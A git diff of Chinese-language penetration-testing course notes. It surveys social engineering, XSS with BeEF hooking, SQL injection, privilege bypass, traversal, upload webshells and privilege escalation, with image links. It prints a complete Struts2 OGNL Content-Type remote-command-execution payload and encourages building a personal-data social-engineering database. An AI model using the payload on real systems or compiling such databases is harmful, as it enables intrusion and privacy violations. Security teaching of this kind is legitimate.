@@ -9,6 +9,15 @@ permalink: mydoc_release_notes_50.html
 folder: mydoc
 ---
 
+双十一来了，团队也在想着为大家搞点福利。所以特约好朋友给大家开几期渗透测试课程。此次课程基本上就是利用自己搭建靶场和编写靶场，给大家进行讲解。大佬已经有着非常丰富的渗透测试经验，必定会把套路传给大家。
+明天启程系列课程也会进行更新，视频文章同时出，由于上节课程听朋友们普遍反映声音比较低，就没有进行外放，这次老师会把上一节课程全部补上，在进行全部外放。
+***
+
+> 福利：2篇技术文章+2个视频
+
+
+
+
 ## 社工技术
 ***
 社会工程学（Social Engineering，又被翻译为：社交工程学）在上世纪60年代左右作为正式的学科出现，广义社会工程学的定义是：建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题，经过多年的应用发展，社会工程学逐渐产生出了分支学科，如公安社会工程学（简称公安社工学）和网络社会工程学。
@@ -19,14 +28,16 @@ folder: mydoc
 
 - 利用工具（请参考红日第一课）
 > 例：对红日实验室的简单社工
-图片
+
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/攻防第三节/启程渗透测试/1_meitu_1.jpg)
 
 现在的网络环境对安全越来越重视，无疑加大了信息搜集的难度，在以后的学习道路上我们要收集搭建属于自己的社工库，比如说
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2_meitu_2.jpg)
 
 在日后的课程中，我也会带着大家搭建这样的社工库并提供部分数据
-图片1
-图片2
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3_meitu_3.jpg)
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png)
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png)
 
 这样的一个社工库，里面加入我们收集到的数据，并逐渐扩大我们的数据库内容，这样在以后的工作中会对你提供很大的帮助。
 
@@ -45,7 +56,7 @@ folder: mydoc
 - 漏洞靶场：虚拟搭建的各类型服务器+提权工具
 - 漏洞实战演练：在真实环境下获取webshell后实战操作
 
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6_meitu_6.jpg)
 
 - 个人总结：溢出漏洞可以直接获取服务器的最高权限，危害巨大，但利用环境要求较高，不易利用成功。
 
@@ -61,11 +72,14 @@ folder: mydoc
   + （3）DOM跨站（DOM XSS）:DOM(document object model文档对象模型)，客户端脚本处理逻辑导致的安全问题。
 - 漏洞靶场：
 
-图片1
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7_meitu_7.jpg)
+
 当我们访问这个页面时，我们的ＰＣ就在攻击者的beef中上线了
-图片2
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.jpg)
+
 通过 beef，我们可以对上线的浏览器进行很多的后门操作比如最基本的弹窗：
-图片3
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.jpg)
+
 - 漏洞实战演练：`http://www.alliedjeep.com/87508.htm`  `couponPHP CMS 1.0`跨站脚本漏洞
 `couponPHP`是优惠劵和交易网站的内容管理系统。
 `couponPHP CMS 1.0`版本没有正确过滤 `/admin/ajax/comments_paginate.php` 或 `/admin/ajax/stores_paginate.php`的 "sEcho" GET 参数值，在实现上存在多个跨站脚本漏洞，可导致在用户浏览器会话中执行任意HTML和脚本代码。
@@ -77,18 +91,21 @@ folder: mydoc
 - 漏洞原理：SQL注入攻击是黑客对数据库进行攻击的常用手段之一。随着B/S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。
 - 漏洞靶场：在我们的靶场中我们会了解查询到底是怎么一回事，数据是怎么样传入的
 
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.jpg)
 
 上面两个图片，是数据以`get`及`post`方式发送的代码内容，我们的参数就是以这种形式发送的。而后台接收后的样子类似是这样的
 `Select * from (xxx数据表) where what=(‘id’) ` `id`为你输入的参数，而`sql`注入就是在这个语句后面加入攻击者自己构造的语句，使数据库查询出我们想要的数据并给前台一定的提示。
 并会在我们的靶场中进行攻击学习.
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.jpg)
+
 漏洞实战演练：`http://www.cnblogs.com/moqiang02/p/4061399.html`
 
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.jpg)
+
 - 个人总结：sql注入仍然是被利用最多的漏洞，他的危害程度和利用范围也是其他漏洞不可以比的，而且逐渐开始工具化，手工注入越来越少，虽然难度大的注入漏洞几乎只能用手工去做，但一点也不影响工具的推广和利用，比较常用的攻击工具sqlmap，可以实现大量的绕过和注入方法。当然，因为他的功能越来越强大，使用的方法也越来越复杂，有的注入点，有可能同样是用sqlmap，小白就注入不进去，可是有的老手就可以通过对语句和参数的修改注入成功。
 当然有很多的注入点也需要自己手工去写一些脚本去进行测试，因为盲注这一形式的存在，给手工注入带来了巨大的麻烦，图片为我自己编写的盲注的小脚本，可以利用注入去暴力猜出用户的密码。
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/13.jpg)
+
 - POC框架
   + 基于原生POC编写练习
   + 基于框架POC编写练习
@@ -97,7 +114,8 @@ folder: mydoc
 ***
 - 漏洞原理：是指超越权限或权力范围的意思。越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。
 - 漏洞靶场：针对网站的权限绕过，后期会带大家搭建相对环境学习
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14.jpg)
+
 - 漏洞实战演练：`https://loudong.sjtu.edu.cn/show/CNVD-2017-04015`　齐博`CMS`整站系统`V7.0`存在越权访问漏洞
 个人总结：对于越权漏洞的主要挖掘方法：
   + 1.	测试越权一般得有俩号。
@@ -114,7 +132,8 @@ folder: mydoc
 目录列表漏洞：用户访问网站目录地址时，能看到目录下所有文件列表，导致网站目录结构暴露，重要的敏感数据泄露。目录遍历漏洞：程序没有充分过滤用户输入的../之类的目录跳转符，导致用户可以通过提交目录跳转来遍历服务器上的任意文件。使用多个..符号，不断向上跳转，最终停留在根/，通过绝对路径去读取任意文件。
 - 漏洞靶场：简单的网站框架就可以实现相应漏洞，在我们的靶场中会集成本漏洞
 - 漏洞实战演练：`http://sec.sangfor.com.cn/vulns/236.html`　 `Pligg CMS 2.0.2` 目录遍历漏洞
-- 图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15.jpg)
+
 - 个人总结：其实在目录漏洞需要配合其他的漏洞进行组合攻击，单独目录漏洞的危害性并不大，但他的可利用程度确很高，当存在其他的漏洞时，这个漏洞就可以帮助我们获取到更多的权限。
 
 ## 文件包含漏洞
@@ -131,13 +150,15 @@ folder: mydoc
 ***
 - 漏洞原理：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。
 - 漏洞靶场：
-- tupian
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/16.jpg)
+
 - 漏洞实战演练：网上随处可见的`struts2`网站，只要是没有升级或打上补丁的，都会存在问题
 - 个人总结：最常见的命令执行漏洞就是`struts2`漏洞了，当然，还有`weblogic`等等，今天主要给大家分享`struts2`的相关知识
 `Struts2`是一个基于`MVC`设计模式的`Web`应用框架，它本质上相当于一个servlet，在MVC设计模式中，`Struts2`作为控制器`(Controller)`来建立模型与视图的数据交互。`Struts 2`是`Struts`的下一代产品，是在 `struts 1`和`WebWork`的技术基础上进行了合并的全新的`Struts 2`框架。其全新的`Struts 2`的体系结构与`Struts 1`的体系结构差别巨大。`Struts 2`以`WebWork`为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与`ServletAPI`完全脱离开，所以`Struts 2`可以理解为`WebWork`的更新产品。虽然从`Struts 1`到`Struts 2`有着太大的变化，但是相对于`WebWork，Struts 2`的变化很小。
 对应ＰＯＣ：
 `["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"`
-简单的利用方法：图片
+简单的利用方法
+
 ## 弱口令漏洞
 ***
 - 漏洞原理：就是说由常用数字、字母、字符等组合成的，容易被别人通过简单及平常的思维方式就能猜到的密码，利用弱口令结合计算机系统等漏洞可以做到入侵的事半功倍的效果
@@ -150,7 +171,8 @@ folder: mydoc
 ***
 - 漏洞原理：在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。
 - 漏洞靶场：
-- tupian
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17.jpg)
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/18.jpg)
 
 - 漏洞实战演练：`https://www.lvtao.net/shell/phpcms-upload-webshell.html`　 `phpcms`前台头像上传漏洞导致`webshell`详解及案例
 - 个人总结：这个漏洞被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。
@@ -170,10 +192,10 @@ folder: mydoc
   + 根据我们的目标，我们要开始收拾信息，网站的基本信息，管理者的行为信息，目标的内部环境等，我们有了一个跳板就要把我们可以拿到的点都拿到手中，这样才可以保证我们的目的达成。
 - 系统漏洞利用：
   + 我们的主要方法是溢出漏洞，当然也存在其他的提权方法，但在这节课中不涉及那些高级的应用了。在溢出漏洞中，我们首先要通过我们收集到的信息来确定我们可以利用的漏洞有可能有那些，如果运气好，我们的漏洞有可以利用的那直接利用已有的角本，我们可以直接拿到服务器的权限了，如果不能，那就要去一点点的测试，看看这个系统上安装了什么软件，然后去寻找一个可以让我们利用的溢出点，能过编写这个脚本来进行提权。比较常见的提权脚本有：
-tupian
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/19.jpg)
 
 当然，还有很多很多，我就不一一展示了，还有一部分要涉及到密码的寻找，如果，我们没有办法溢出，那我们就要想办法找到高级管理员的密码，来登录到高权限的帐户上去
-图片
+![](https://raw.githubusercontent.com/redBu1l/Redclub-Launch/master/%E6%94%BB%E9%98%B2%E7%AC%AC%E4%B8%89%E8%8A%82/%E5%90%AF%E7%A8%8B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/20.jpg)
 
 ## 后门
 ***
